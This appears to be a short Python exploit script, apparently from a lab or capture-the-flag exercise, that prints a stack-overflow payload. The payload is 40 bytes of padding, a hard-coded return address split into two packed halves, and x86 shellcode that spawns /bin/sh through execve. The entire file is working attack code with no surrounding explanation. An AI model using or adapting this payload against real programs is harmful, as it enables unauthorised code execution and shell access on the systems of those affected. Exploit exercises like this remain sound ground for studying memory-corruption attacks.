import sys
from struct import pack

ret_addr2 = 0xffffde60
ret_addr1 = 0x7fff

ret_addr2 = pack("<I", ret_addr2 + 48)
ret_addr1 = pack("<I", ret_addr1)

# Shellcode & return address
shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
    
sys.stdout.buffer.write(b"A"*40 + ret_addr2 + ret_addr1 + shellcode)
 
